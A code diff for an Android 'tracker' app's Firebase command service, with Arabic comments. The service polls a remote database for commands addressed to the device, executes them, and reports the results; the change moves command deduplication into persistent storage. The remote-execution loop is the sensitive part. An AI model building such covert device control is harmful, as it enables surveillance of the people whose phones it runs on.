@@ -14,8 +14,6 @@ import com.abuzahra.tracker.CommandExecutor
 import com.abuzahra.tracker.SharedPrefsManager
 import kotlinx.coroutines.*
 import org.json.JSONObject
-import java.io.BufferedReader
-import java.io.InputStreamReader
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -23,11 +21,12 @@ import java.net.URL
  * FirebaseCommandService - خدمة الاستماع لأوامر Firebase
  * تستمع لأوامر البوت من Firebase RTDB وتنفذها فوراً
  * 
- * === الإصلاح v3.2: منع تنفيذ الأمر أكثر من مرة ===
- * 1. تخزين معرّفات الأوامر المُعالجة في الذاكرة
- * 2. تحديث حالة الأمر بشكل متزامن (ليس غير متزامن)
- * 3. تنظيف الأوامر القديمة عند بدء التشغيل
- * 4. زيادة فترة الاستطلاع إلى 10 ثواني
+ * === الإصلاح v4.0: منع تنفيذ الأمر أكثر من مرة (مستمر) ===
+ * 1. تخزين معرّفات الأوامر المُعالجة في SharedPreferences (يصمد عبر إعادة التشغيل)
+ * 2. حذف الأمر من Firebase BEFORE التنفيذ (atomic read-and-delete)
+ * 3. تحديث حالة الأمر بشكل متزامن (ليس غير متزامن)
+ * 4. تنظيف الأوامر القديمة (> 5 دقائق) بشكل دوري
+ * 5. زيادة فترة الاستطلاع إلى 10 ثواني
  */
 class FirebaseCommandService : Service() {
 
@@ -37,17 +36,17 @@ class FirebaseCommandService : Service() {
         private const val CHANNEL_ID = "firebase_cmd_channel"
         private const val FIREBASE_RTDB_URL = "https://studio-7073076148-6afe0-default-rtdb.firebaseio.com"
         private const val POLL_INTERVAL = 10000L // 10 seconds (increased to prevent race condition)
+
+        // Persistent dedup storage
+        private const val PREFS_PROCESSED = "processed_commands_prefs"
+        private const val KEY_PROCESSED_IDS = "processed_cmd_ids"
     }
 
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
-    // === مجموعة الأوامر التي تم تنفيذها لمنع التكرار ===
-    private val processedCmdIds = mutableSetOf<String>()
-    private val processedCmdLock = Any()
-
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "تم إنشاء خدمة استماع Firebase (v3.2 - anti-repeat)")
+        Log.d(TAG, "تم إنشاء خدمة استماع Firebase (v4.0 - persistent anti-repeat)")
         startForegroundNotification()
         startFirebasePolling()
     }
@@ -66,6 +65,72 @@ class FirebaseCommandService : Service() {
         startForeground(NOTIFICATION_ID, notification)
     }
 
+    // ==================== Persistent Dedup Helpers ====================
+
+    private fun getProcessedPrefs(context: Context): android.content.SharedPreferences {
+        return context.getSharedPreferences(PREFS_PROCESSED, Context.MODE_PRIVATE)
+    }
+
+    private fun loadProcessedIds(context: Context): MutableSet<String> {
+        val prefs = getProcessedPrefs(context)
+        return prefs.getStringSet(KEY_PROCESSED_IDS, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
+    }
+
+    private fun saveProcessedId(context: Context, cmdId: String) {
+        val prefs = getProcessedPrefs(context)
+        val ids = loadProcessedIds(context)
+        ids.add(cmdId)
+        // Keep only last 50 entries to avoid unbounded growth
+        while (ids.size > 50) ids.remove(ids.first())
+        prefs.edit()
+            .putStringSet(KEY_PROCESSED_IDS, ids)
+            .putLong("ts_$cmdId", System.currentTimeMillis())
+            .apply()
+    }
+
+    /** Check if a command was already processed (persistent check) */
+    private fun isAlreadyProcessed(context: Context, cmdId: String): Boolean {
+        return cmdId in loadProcessedIds(context)
+    }
+
+    /** Clean entries older than 5 minutes */
+    private fun cleanOldProcessedIds(context: Context) {
+        try {
+            val prefs = getProcessedPrefs(context)
+            val ids = loadProcessedIds(context)
+            val now = System.currentTimeMillis()
+            val fiveMinutes = 5 * 60 * 1000L
+            val editor = prefs.edit()
+            val toRemove = mutableListOf<String>()
+            for (id in ids) {
+                val timestamp = prefs.getLong("ts_$id", 0)
+                if (timestamp > 0 && (now - timestamp) > fiveMinutes) {
+                    toRemove.add(id)
+                }
+            }
+            if (toRemove.isNotEmpty()) {
+                ids.removeAll(toRemove)
+                editor.putStringSet(KEY_PROCESSED_IDS, ids)
+                for (id in toRemove) {
+                    editor.remove("ts_$id")
+                }
+                editor.apply()
+                Log.d(TAG, "تنظيف ${toRemove.size} معرّفات أوامر قديمة")
+            }
+            // Also cap at 50
+            while (ids.size > 50) {
+                val oldest = ids.first()
+                ids.remove(oldest)
+                editor.remove("ts_$oldest")
+            }
+            editor.putStringSet(KEY_PROCESSED_IDS, ids).apply()
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في تنظيف المعرّفات القديمة: ${e.message}")
+        }
+    }
+
+    // ==================== Firebase Polling ====================
+
     private fun startFirebasePolling() {
         serviceScope.launch {
             Log.d(TAG, "بدء استطلاع Firebase للأوامر...")
@@ -78,8 +143,8 @@ class FirebaseCommandService : Service() {
                     Log.e(TAG, "خطأ في استطلاع Firebase: ${e.message}")
                 }
                 delay(POLL_INTERVAL)
-                // تنظيف ذاكرة الأوامر المُعالجة
-                cleanProcessedCache()
+                // تنظيف المعرّفات القديمة بشكل دوري
+                cleanOldProcessedIds(this@FirebaseCommandService)
             }
         }
     }
@@ -125,30 +190,6 @@ class FirebaseCommandService : Service() {
         }
     }
 
-    /** تنظيف ذاكرة الأوامر المُعالجة */
-    private fun cleanProcessedCache() {
-        synchronized(processedCmdLock) {
-            if (processedCmdIds.size > 100) {
-                val toRemove = processedCmdIds.take(processedCmdIds.size - 50)
-                processedCmdIds.removeAll(toRemove)
-            }
-        }
-    }
-
-    /** التحقق مما إذا تم معالجة الأمر مسبقاً */
-    private fun isAlreadyProcessed(cmdId: String): Boolean {
-        synchronized(processedCmdLock) {
-            return cmdId in processedCmdIds
-        }
-    }
-
-    /** تسجيل الأمر كمُعالج */
-    private fun markAsProcessed(cmdId: String) {
-        synchronized(processedCmdLock) {
-            processedCmdIds.add(cmdId)
-        }
-    }
-
     private suspend fun pollFirebaseCommands() {
         val deviceId = SharedPrefsManager.getDeviceId(this@FirebaseCommandService) ?: return
         
@@ -181,8 +222,8 @@ class FirebaseCommandService : Service() {
             val keys = commandsObj.keys()
             for (cmdId in keys) {
                 try {
-                    // === منع تنفيذ نفس الأمر مرتين ===
-                    if (isAlreadyProcessed(cmdId)) {
+                    // === منع تنفيذ نفس الأمر مرتين (persistent check via SharedPreferences) ===
+                    if (isAlreadyProcessed(this@FirebaseCommandService, cmdId)) {
                         Log.d(TAG, "Firebase: تم تخطي الأمر $cmdId (مُعالج مسبقاً)")
                         deleteCommandFromFirebaseSync(deviceId, cmdId)
                         continue
@@ -196,30 +237,29 @@ class FirebaseCommandService : Service() {
                     val command = cmdObj.getString("command")
                     val params = cmdObj.optJSONObject("params") ?: JSONObject()
                     
-                    // === تسجيل الأمر فوراً قبل التنفيذ (يمنع التكرار حتى لو حدث خطأ) ===
-                    markAsProcessed(cmdId)
+                    // === تسجيل الأمر فوراً في SharedPreferences (يصمد عبر إعادة التشغيل) ===
+                    saveProcessedId(this@FirebaseCommandService, cmdId)
                     
                     Log.d(TAG, "Firebase: تنفيذ الأمر $command (id=$cmdId)")
-                    
-                    // Mark as processing - SYNCHRONOUS (يمنع التكرار)
-                    markCommandProcessingSync(deviceId, cmdId)
+
+                    // === ATOMIC: Delete from Firebase BEFORE execution ===
+                    // This prevents the command from being picked up again if the app crashes during execution
+                    deleteCommandFromFirebaseSync(deviceId, cmdId)
                     
                     // Execute the command
                     val result = CommandExecutor.execute(this@FirebaseCommandService, command, params)
                     Log.d(TAG, "نتيجة الأمر $command: ${result.take(200)}")
                     
-                    // Write result to Firebase FIRST (synchronous - must complete before delete)
+                    // Write result to Firebase
                     writeResultToFirebaseSync(deviceId, cmdId, command, result)
-                    
-                    // Delete the command from Firebase after result is written
-                    deleteCommandFromFirebaseSync(deviceId, cmdId)
                     
                 } catch (e: Exception) {
                     Log.e(TAG, "خطأ في معالجة الأمر: ${e.message}")
-                    // تسجيل حتى الأخطاء لمنع إعادة المحاولة
-                    markAsProcessed(cmdId)
+                    // تسجيل حتى الأخطاء لمنع إعادة المحاولة (persistent)
+                    saveProcessedId(this@FirebaseCommandService, cmdId)
                     // Write error result
                     writeResultToFirebaseSync(deviceId, cmdId, "error", """{"ok":false,"error":"${e.message}"}""")
+                    // Ensure command is deleted
                     deleteCommandFromFirebaseSync(deviceId, cmdId)
                 }
             }
@@ -228,31 +268,7 @@ class FirebaseCommandService : Service() {
         }
     }
 
-    /**
-     * Mark as processing - SYNCHRONOUS
-     * يجب أن يكتمل قبل التنفيذ لمنع التكرار
-     * الإصدار السابق كان غير متزامن (serviceScope.launch) مما يسبب تنفيذ الأمر مرتين
-     */
-    private suspend fun markCommandProcessingSync(deviceId: String, cmdId: String) {
-        try {
-            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId/status.json")
-            val connection = url.openConnection() as HttpURLConnection
-            connection.requestMethod = "PUT"
-            connection.setRequestProperty("Content-Type", "application/json")
-            connection.doOutput = true
-            connection.connectTimeout = 5000
-            connection.readTimeout = 5000
-            connection.outputStream.write("\"processing\"".toByteArray())
-            connection.outputStream.flush()
-            connection.responseCode // Wait for response
-            connection.disconnect()
-            Log.d(TAG, "تم تحديث حالة الأمر $cmdId إلى processing (متزامن)")
-        } catch (e: Exception) {
-            Log.e(TAG, "خطأ في تحديث حالة الأمر: ${e.message}")
-        }
-    }
-
-    /** Write result to Firebase - SYNCHRONOUS to ensure result is written before command is deleted */
+    /** Write result to Firebase - SYNCHRONOUS to ensure result is written */
     private fun writeResultToFirebaseSync(deviceId: String, cmdId: String, command: String, result: String) {
         try {
             val resultObj = JSONObject()
@@ -279,7 +295,7 @@ class FirebaseCommandService : Service() {
         }
     }
 
-    /** Delete command from Firebase - SYNCHRONOUS after result write */
+    /** Delete command from Firebase - SYNCHRONOUS */
     private fun deleteCommandFromFirebaseSync(deviceId: String, cmdId: String) {
         try {
             val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId.json")
